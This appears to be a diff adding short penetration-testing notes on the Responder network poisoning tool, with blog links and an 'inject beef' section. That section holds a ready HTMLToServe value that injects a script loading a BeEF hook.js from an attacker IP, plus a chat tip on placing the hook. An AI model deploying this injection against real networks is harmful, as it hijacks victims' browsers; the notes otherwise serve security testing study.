@@ -1,0 +1,16 @@
+# Responder
+
+https://github.com/SpiderLabs/Responder
+http://g-laurent.blogspot.com.au/
+http://blog.spiderlabs.com/2012/10/introducing-responder-10.html
+http://blog.spiderlabs.com/2013/01/owning-windows-networks-with-responder-17.html
+http://blog.spiderlabs.com/2013/02/owning-windows-network-with-responder-part-2.html
+http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html
+
+# inject beef
+
+HTMLToServe = <html><head></head><body><script src="http://192.168.11.49:3000/hook.js" type="text/javascript"></script></body></html>
+[10/28/2014 8:12:37 PM] antisnatchor: form the article
+[10/28/2014 8:12:45 PM] antisnatchor: better to add BeEF hook in </head>
+[10/28/2014 8:12:54 PM] antisnatchor: so <scripta>beef</script></head>
+also read: https://www.christophertruncer.com/getting-hooked-responder-beef/
